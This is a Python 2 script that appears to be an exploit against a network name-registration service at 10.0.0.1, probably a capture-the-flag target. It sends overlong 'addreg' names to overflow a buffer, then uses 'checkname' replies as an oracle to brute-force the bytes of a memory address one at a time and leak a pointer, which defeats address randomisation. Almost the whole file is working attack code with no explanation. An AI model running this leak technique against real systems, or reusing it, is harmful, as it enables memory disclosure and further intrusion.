#!/usr/bin/env python
import socket
from struct import *
import time
import sys
import struct
import random

#pre beta file for test

TCP_IP = '10.0.0.1'
TCP_PORT = 20005
BUFFER_SIZE = 1024


def register(s, name):
	s.send("addreg " + name + " 32 127.0.0.1\n")
#	print "addreg " + name + " 32 127.0.0.1"
	return True

def unregister(s, name):
	s.send("addreg " + name + " 0 0.0.0.0\n")
#	print "addreg " + name + " 0 0.0.0.0"
	return True

def checkname(s, name):
	s.send("checkname " + name + "\n")
#	print "checkname " + name
	data = s.recv(BUFFER_SIZE)
#	print data
	if "is not indexed already" in data:
		return False
	else:
		return True 

def bruteforce(s, prefix, postfix, range):
	candidates = []
	for i in range:
		if i == 32:
			continue
		register(s, prefix + chr(i) + postfix)
		time.sleep(0.1)
		checkname(s, "test")
		result0 = checkname(s, prefix)
		result1 = checkname(s, prefix)
		unregister(s, prefix + chr(i) + postfix)
		if result0 or result1:
#			print result0
#			print result1
			print "possible candidate: "+str(hex(i))
			candidates.append(i)
			continue
	return candidates

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print "received data:", data

#test whether it works
register(s, "A"*16+"\x04")
time.sleep(0.5)
checkname(s, "test")
result = []

for i in xrange(4):
	result.append(checkname(s, "A"*16))

unregister(s, "A"*16+"\x04")
for i in xrange(4):
	result.append(checkname(s, "A"*16))

if (result[0] or result[1]) and (result[2] or result[3]):
	if not (result[4] or result[5] or result[6] or result[7]): 
		print "Works!"
	else:
		print "Does not work!"
		sys.exit()
else:
	print "Does not work!"
	sys.exit()

retestedmemory = []
print "trying to find hightest byte"
memory = bruteforce(s, "A"*15, "\x04", range(0,256))
print "final: "
retestedmemory.append(bruteforce(s, "B"*15, "\x04", memory)[0])
print "final: " + str(hex(retestedmemory[0]))

print "trying to find second hightest byte"
memory = range(0,256)
#memory = bruteforce(s, "A"*14, chr(retestedmemory[0])+"\x04", range(0,256))
while len(memory) != 1:
	memory = bruteforce(s, chr(random.randint(0x41,0x4a))*14, chr(retestedmemory[0])+"\x04", memory)

retestedmemory.append(memory[0])
print "final: " + str(hex(retestedmemory[1]))
#retestedmemory.append(0xb7)
#retestedmemory.append(0x71)
print "trying to find second lowest byte"
#memory = bruteforce(s, "A"*13, chr(retestedmemory[1])+chr(retestedmemory[0])+"\x04", range(0,256))
memory = range(0,256)
while len(memory) != 1:
	memory = bruteforce(s, chr(random.randint(0x41,0x4a))*13, chr(retestedmemory[1])+chr(retestedmemory[0])+"\x04", memory)
#memory = bruteforce(s, "A"*13, chr(retestedmemory[0])+chr(retestedmemory[1])+"\x04", range(0x58,0x59))
print "."
#memory = bruteforce(s, "B"*13, chr(retestedmemory[1])+chr(retestedmemory[0])+"\x04", memory)
print "."
#memory = bruteforce(s, "A"*13, chr(retestedmemory[0])+chr(retestedmemory[1])+"\x04", memory)
print "."
print str(hex((retestedmemory[0]<<16) + (retestedmemory[1]<<8) + (((memory[0]>>4)-2)<<4))) 

s.close()

